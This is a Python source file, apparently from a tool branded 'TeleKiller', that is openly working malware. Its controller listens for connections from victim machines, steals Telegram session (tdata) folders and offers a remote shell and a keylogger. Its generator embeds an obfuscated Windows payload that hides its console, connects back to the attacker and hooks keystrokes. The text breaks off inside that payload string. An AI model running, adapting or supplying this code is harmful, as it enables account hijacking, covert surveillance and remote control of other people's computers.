# -*- coding: UTF-8 -*-
import socket
from os import system,popen,path,remove
import sys
from colorama import Fore,init,Back
from random import random
import time
init(autoreset=True)
def download_tdata(client,file_save):
    try:
        data_file=client.recv(1024)
    except:
        print ("BACK.BLUE+\nSession closed\n")
        return False
    else:
        while(data_file):
            if 'pishmarg' in data_file:
                break
            else:
                file_save.write(data_file)
                try:
                    data_file=victim.recv(1024)
                except:
                    print Back.BLUE+"\nSession Closed\n"
                    return False
                    break
        data_file=data_file.replace('pishmarg','')
        if len(data_file)!=0:
            file_save.write(data_file)
def check_integer(num):
    try:
        int(num)
    except:
        return False
    else:
        return True
def shell_or_keylogger(client):
    print Fore.BLACK+"#"*39
    print Fore.WHITE+"ID\tItem"
    print Fore.WHITE+"===\t===="
    print Fore.GREEN+"[0]\t"+Fore.YELLOW+"Keylogger"
    print Fore.GREEN+"[1]\t"+Fore.YELLOW+"Shell\n"
    print Fore.WHITE+"\n====\t====\n"+Fore.GREEN+"[99]"+Fore.YELLOW+"\texit\n"
    licen_item=0
    while True:
        try:
            soks=raw_input(Fore.CYAN+'SELECT> ')
        except:
            pass
        if soks=='1' or soks=='0':
            if soks=='0':
                try:
                    client.send('keylo')
                except:
                    print Back.BLUE+"\nSession Closed\n"
                    return False
                    break
                else:
                    licen_item=1
                    break
            elif soks=='1':
                try:
                    client.send('shell')
                except:
                    print Back.BLUE+"\nSession Closed\n"
                    return False
                    break
                else:
                    licen_item=2
                    break
        elif soks=='99':
            print
            break
        else:
            print "\nInvalid ID\n"
    if licen_item==1:
        try:
            save_file=raw_input('\nSave Logs?[y,n]')
        except:
            pass
        licen_lf=0
        if save_file in ['Y','y','yes','YES','Yes']:
            print "\nSave -> logs_file.txt"
            file_logs=open('logs_file.txt','a')
            file_logs.write('\n----------------------\n')
            file_logs.close()
            licen_lf=1
        client.send('y')
        print 'For Stop Keylogger ---> [Ctrl + C]'
        print "\nSTART Keylogger"
        print "---------------"
        while True:
            try:
                while True:
                    client.send('n')
                    event_=client.recv(1024)
                    if event_=='null':
                        break
                    else:
                        if 'PID' in event_:
                            print event_.replace('null','')
                            if licen_lf==1:
                                file_logs=open('logs_file.txt','a')
                                file_logs.write('\n'+event_.replace('null','')+' ')
                                file_logs.close()
                        else:
                            if event_.replace('null','')!='':
                                print event_.replace('null','')
                                if licen_lf==1:
                                    file_logs=open('logs_file.txt','a')
                                    file_logs.write(event_.replace('null','')+' ')
                                    file_logs.close()
            except socket.error:
                print Back.BLUE+'\nSesssin Closed\n'
                return False
                break
            except:
                print '\n\nSTOP Keylogger\n'
                client.send('not')
                return True
                break
        if licen_lf==1:
            file_logs.close()
    elif licen_item==2:
        print 'For Stop Shell ---> [type exit and enter]\n'
        print '\nSTART Shell'
        print '---------------'
        while True:
            my_path=client.recv(10240)
            if my_path!='null':
                break
        time.sleep(1)
        try:
            list_drive=client.recv(20).split(':')
        except:
            print Back.BLUE+"\nSession Closed\n"
            return False
        else:
            while True:
                try:
                    cmd=raw_input(my_path+'>')
                except:
                    pass
                cmd=cmd.replace('\"','').replace('\'','')
                try:
                    if cmd[0:3]=='cd ' and len(cmd)>3:
                        client.send(cmd)
                        time.sleep(1)
                        res=client.recv(10240)
                        if res=='not':
                            print "The system cannot find the drive specified.\n"
                        else:
                            my_path=res
                    elif cmd.upper()[0] in list_drive and cmd[1]==':' and len(cmd)==2:
                        client.send(cmd)
                        time.sleep(1)
                        res=client.recv(10240)
                        if res=='not':
                            print "The system cannot find the drive specified.\n"
                        else:
                            my_path=res

                    elif cmd.split()[0]=='exit':
                        try:
                            client.send('break')
                            print '\n\nSTOP Shell\n'
                        except:
                            return False
                            break
                        else:
                            return True
                            break
                    
                    else:
                        client.send(cmd)
                        time.sleep(1)
                        print client.recv(10240)
                except socket.error:
                    print Back.BLUE+'\nSesssin Closed\n'	
                    return False
                    break
                except:
                    client.send('break')
                    print '\nSTOP Shell\n'
                    return True
                    break
def banner():
    if sys.platform[0:3]=='win':
        system('cls')
    else:
        exit()
    print Fore.GREEN+u"""  ╔══════════════════════════════════════════════════════════════════════════════════╗
  ║ \x1b[36m████████╗███████╗██╗     ███████╗    ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ \x1b[32m ║
  ║ \x1b[36m╚══██╔══╝██╔════╝██║     ██╔════╝    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗ \x1b[32m║
  ║    \x1b[36m██║   █████╗  ██║     █████╗      █████╔╝ ██║██║     ██║     █████╗  ██████╔╝\x1b[32m ║
  ║    \x1b[36m██║   ██╔══╝  ██║     ██╔══╝      ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗\x1b[32m ║
  ║    \x1b[36m██║   ███████╗███████╗███████╗    ██║  ██╗██║███████╗███████╗███████╗██║  ██║\x1b[32m ║
  ║    \x1b[36m╚═╝   ╚══════╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝\x1b[32m ║
  ╚═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦════════════════════════════════════╝
  ╔═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╗
  ║\x1b[33m WebSite : UltraSec.org\x1b[32m                        ║
  ║\x1b[33m Channel : @UltraSecurity\x1b[32m                      ║
  ║\x1b[33m Developers : Ashkan Moghaddas , Behzad Magzer\x1b[32m ║
  ╚═══════════════════════════════════════════════╝
\n\x1b[37m  OPTIONS:\n\n\t(\x1b[41m1\x1b[0m\x1b[37m) Generate\n\n\t(\x1b[41m2\x1b[0m\x1b[37m) Listening\n\n\t(\x1b[41m3\x1b[0m\x1b[37m) Exit\n"""



def check_install_module():
    pip_install=popen('pip freeze').read()
    list_module=[
        'altgraph'
        ,'colorama'
        ,'dis3'
        ,'future'
        ,'macholib'
        ,'pefile'
        ,'pywin32-ctypes'
        ,'PyInstaller'
        ,'pyHook'
        ,'pywin32==220']
    lfm=[]
    for m in list_module:
        if m not in pip_install:
            lfm.append(m)
    if len(lfm)!=0:
        system('cls')
        print Fore.WHITE+"="*31
        for fi in lfm:
            print fi.replace('==220',''),'-> Not Installed'
        print Fore.WHITE+"="*31
        try:
            raw_input()
        except:
            pass
        exit()
check_install_module()
banner()
while True:
    try:
        cmd=raw_input(Fore.MAGENTA+'UltraSec@TeleKiller\x1b[37m:\x1b[34m~\x1b[37m#\x1b[0m ')
    except:
        banner()
    if cmd=='3':
        break
    elif cmd=='2':
        print
        lhost=raw_input(Fore.RED+'LHOST-> ')
        if lhost=='':
            lhost=socket.gethostbyname(socket.gethostname())
            print Fore.GREEN+'\nDefault LHOST : %s\n'%(lhost)
        else:
            print Fore.GREEN+'\nLHOST : '+lhost+'\n'
        lport=raw_input(Fore.RED+'LPORT-> ')
        if lport=='':
            lport=4444
            print Fore.GREEN+'\nDefault LPORT : 4444\n'
        else:
            print Fore.GREEN+'\nLPORT : '+lport+'\n'
        if check_integer(lport)==True:    
            server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            try:
                lport=int(lport)
                server.bind((lhost,lport))
            except socket.error:
                print Fore.RED+'[!]\x1b[0mCan\'t Bind %s:%s'%(lhost,lport)    
            else:
                try:
                    print Fore.RED+'\nListening'
                    print Fore.CYAN+'[#]\x1b[37m%s:%s\x1b[0m'%(lhost,lport)
                    server.listen(1)
                except:
                    print Fore.RED+'[!]\x1b[0mCan\'t Listen %s:%s'%(lhost,lport)
                else:
                    victim,addr=server.accept()
                    licen_process=True
                    print Fore.BLUE+'\n[*]\x1b[37mSession OPENED\x1b[0m'
                    print Fore.BLUE+'[*]\x1b[37mVictim IP(%s)\x1b[0m'%(addr[0])
                    try:
                        hostname=victim.recv(1024)
                    except:
                        print Back.BLUE+"\nSession Closed\n"
                        
                    else:
                        try:
                            os_name=victim.recv(1024)
                        except:
                            print Back.BLUE+"\nSession Closed\n"
                        else:        
                            print Fore.BLUE+'[*]\x1b[37mHostname (%s)\x1b[0m'%(hostname)
                            print Fore.BLUE+'[*]\x1b[37mOS name (%s)\x1b[0m'%(os_name)
                            print Fore.WHITE+'\nID\tUser List\n===\t========='
                            user_list=victim.recv(10240)
                            id_user=0
                            user_list=user_list.split('\', \'')
                            for user in user_list:
                                print Fore.GREEN+'['+str(id_user)+']\t'+Fore.YELLOW+user
                                id_user+=1
                            print
                            print Fore.WHITE+'\n====\t====\n'+Fore.GREEN+'[99]\t'+Fore.YELLOW+'exit'
                            print
                    
                            licen_download_tdata=''
                            csf=False
                            while True:
                                try:
                                    select_user=raw_input(Fore.CYAN+'SELECT> ')
                                except:
                                   pass
                                if select_user=='99':
                                    try:
                                        victim.send('break')
                                    except socket.error:
                                        csf=False
                                        print Back.BLUE+"\nSession Closed\n"
                                    break
                                elif check_integer(select_user)==True:
                                    if int(select_user)==0 or int(select_user)<=id_user:
                                        try:
                                            victim.send(user_list[int(select_user)])
                                        except:
                                            print Back.BLUE+"\nSession Closed\n"
                                            break
                                        else:
                                            licen_download_tdata=victim.recv(3)
                                            if licen_download_tdata=='yes':
                                                break
                                            else:
                                                print '\n'+user_list[int(select_user)]+' Has Not Telegram\n'
                                    else:
                                        print "\nInvalid ID\n"
                                else:
                                    print "\nInvalid ID\n"
                            rd=None
                            if licen_download_tdata=='yes':
                                print Fore.MAGENTA+'\nStart Download (TDATA) Folder\n'+Fore.GREEN+'============================='
                                print ''
                                random_name='tdata_'+str(random()).replace('0.','')+'.tar.bz2'
                                popen('mkdir downloads').read()
                                f=open('./downloads/'+random_name,'wb')
                                
                                rd=download_tdata(victim,f)
                                if rd==False:
                                    print Back.RED+"\nBreak Download (TDATA) Folder\n"
                                else:
                                    print Fore.CYAN+'Save -> downloads/'+random_name
                                print Fore.GREEN+'\n=============================\n'
                                f.close()
                            print
                            if csf==False and rd==None:
                                while True:
                                    try:
                                        qks=raw_input('You Can Access Shell Or Keylogger?[y/n]')
                                    except:
                                        pass
                                    if qks in ['YES','yes','Yes','y','Y']:
                                        session_status=shell_or_keylogger(victim)
                                        if session_status==True:
                                            pass
                                        else:
                                            break
                                    elif qks in ['N','n','No','NO','no']:
                                        break
                                    else:
                                        print "\nInvalid : Enter y OR n\n"                                        
    elif cmd=='1':
        print
        lhost=raw_input(Fore.GREEN+'LHOST-> ')
        if lhost=='':
            lhost=socket.gethostbyname(socket.gethostname())
            print Fore.RED+'\nDefault LHOST : '+lhost+'\n'
        else:
            print Fore.RED+'\nLHOST : '+lhost+'\n'
        lport=raw_input(Fore.GREEN+'LPORT-> ')
        if lport=='':
            lport=4444
            print Fore.RED+'\nDefault LPORT : 4444\n'
        else:
            print Fore.RED+'\nLPORT : '+lport+'\n'
        payload_name=raw_input(Fore.GREEN+'NAME-> ')
        if payload_name=='':
            payload_name='payload'
            print Fore.RED+'\nDefault NAME : payload\n'
        else:
            print Fore.RED+'\nNAME : '+payload_name+'\n'
        source_payload='from win32gui import ShowWindow\r\nfrom win32console import GetConsoleWindow\r\ndef a88f05b6c963e145a45b58c47cd42a41():\r\n\tb5b8c74cbd96fbf2de4c1a3527b2fbf4=GetConsoleWindow()\r\n\tShowWindow(b5b8c74cbd96fbf2de4c1a3527b2fbf4,0)\r\n\treturn True\r\na88f05b6c963e145a45b58c47cd42a41()\r\nfrom win32console import GetConsoleWindow\r\nfrom ctypes import *\r\nimport time\r\nfrom subprocess import PIPE,Popen\r\nfrom win32clipboard import OpenClipboard,CloseClipboard,GetClipboardData\r\nfrom pythoncom import PumpWaitingMessages\r\nfrom win32gui import ShowWindow\r\nfrom socket import socket,AF_INET,SOCK_STREAM,gethostname\r\nfrom shutil import make_archive\r\nfrom pyHook import HookManager\r\nfrom os import system,popen,path,chdir\r\nfrom threading import Thread\r\nb3c7cbace395d8b182dbb7ae2c3bfb34=socket(AF_INET,SOCK_STREAM)\r\nb3c7cbace395d8b182dbb7ae2c3bfb34.connect((\'{}\',{}))\r\ndef cefda4932d283cb7f67b9f73fb6e0f14():\r\n    d21dbd2c4e178b2cb55dce0c6a43effc=windll.user32\r\n    b0484c19f1afdaf3841a0d821ed393d2=windll.kernel32\r\n    b0180794a2f65cf48e8d77729a05b926=windll.psapi\r\n    global dea181b04ba971dfa9667785debd1ba7\r\n    dea181b04ba971dfa9667785debd1ba7=None\r\n    def b33530fd4c255242ea04c06ab6895b45():\r\n        b25ffa68ad761f8578cc61700c0140ed=d21dbd2c4e178b2cb55dce0c6a43effc.GetForegroundWindow()\r\n        bdb32b9e1adc6d67be435a81baf9a66e=c_ulong(0)\r\n        d21dbd2c4e178b2cb55dce0c6a43effc.GetWindowThreadProcessId(b25ffa68ad761f8578cc61700c0140ed,byref(bdb32b9e1adc6d67be435a81baf9a66e))\r\n        c9cf7ee85456cd274986e0e317358174="%d"%bdb32b9e1adc6d67be435a81baf9a66e.value\r\n        ee7004c7949d83f130592f15d98ca343=create_string_buffer("\\x00"*512)\r\n        b1c18a5e5fa78d7980e81f27c5286002=b0484c19f1afdaf3841a0d821ed393d2.OpenProcess(0x400|0x10,False,bdb32b9e1adc6d67be435a81baf9a66e)\r\n        b0180794a2f65cf48e8d77729a05b926.GetModuleBaseNameA(b1c18a5e5fa78d7980e81f27c5286002,None,byref(ee7004c7949d83f130592f15d98ca343),512)\r\n        b7d36dcb6d03b8fa977d80032a6bb990=create_string_buffer("\\x00"*512)\r\n        bfa47f7c65fec19cc163b1957b5e3844=d21dbd2c4e178b2cb55dce0c6a43effc.GetWindowTextA(b25ffa68ad761f8578cc61700c0140ed,byref(b7d36dcb6d03b8fa977d80032a6bb990),512)\r\n        fdf206e60de0ef6aa76cb2398adecd4d="<PID %s> - %s - %s "%(c9cf7ee85456cd274986e0e317358174,ee7004c7949d83f130592f15d98ca343.value,b7d36dcb6d03b8fa977d80032a6bb990.value)\r\n        b3c7cbace395d8b182dbb7ae2c3bfb34.send(fdf206e60de0ef6aa76cb2398adecd4d)\r\n    def b954f27ca739ea6b036fcb11d43427a1(event):\r\n        global bcdb92b7b97ef94b9ae4479d3f4ef0fc\r\n        global dea181b04ba971dfa9667785debd1ba7\r\n        if event.WindowName!=dea181b04ba971dfa9667785debd1ba7:\r\n            dea181b04ba971dfa9667785debd1ba7=event.WindowName\r\n            b33530fd4c255242ea04c06ab6895b45()\r\n        if event.Ascii>=33 and event.Ascii<=126:\r\n            b4f802ebfba977727845e8872cb743a7=chr(event.Ascii)\r\n            if len(b4f802ebfba977727845e8872cb743a7)==1:\r\n                b4f802ebfba977727845e8872cb743a7=b4f802ebfba977727845e8872cb743a7.upper()\r\n        else:\r\n            b4f802ebfba977727845e8872cb743a7=event.Key\r\n            if len(b4f802ebfba977727845e8872cb743a7)==1:\r\n                b4f802ebfba977727845e8872cb743a7=b4f802ebfba977727845e8872cb743a7.upper()\r\n            if b4f802ebfba977727845e8872cb743a7==\'Tab\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Tab>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Lcontrol\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<L Control>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Rcontrol\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<R Control>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Capital\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Caps Lock>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Lmenu\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<L Alt>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Rmenu\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<R Alt>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Lwin\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<L Win>\'\r\n            if b4f802e
